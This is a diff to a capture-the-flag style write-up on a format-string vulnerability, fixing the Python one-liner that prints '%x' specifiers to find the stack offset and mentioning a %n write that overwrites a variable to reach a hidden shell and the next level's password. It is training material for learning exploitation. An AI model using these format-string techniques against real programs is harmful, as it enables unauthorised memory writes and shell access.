@@ -81,7 +81,7 @@ Therefore, our goal is to use `%n` to write the value `16930116` into the memory
 ## Step 6: Find the ofset
 
 ```bash
-python -c 'print "aaaa" + "%x" + 15' > /tmp/exploit
+python -c 'print "aaaa" + "%x" * 15' > /tmp/exploit
 cat /tmp/exploit | ./level4
 ```
 The ofset is at the 12th position, meaning that the first arg given to printf appears at the 12th position.
@@ -112,6 +112,7 @@ We successfully overwrite `m` and trigger the hidden shell.
 ---
 
 > With this, you can `su level5` using the password.
+
 
 
 
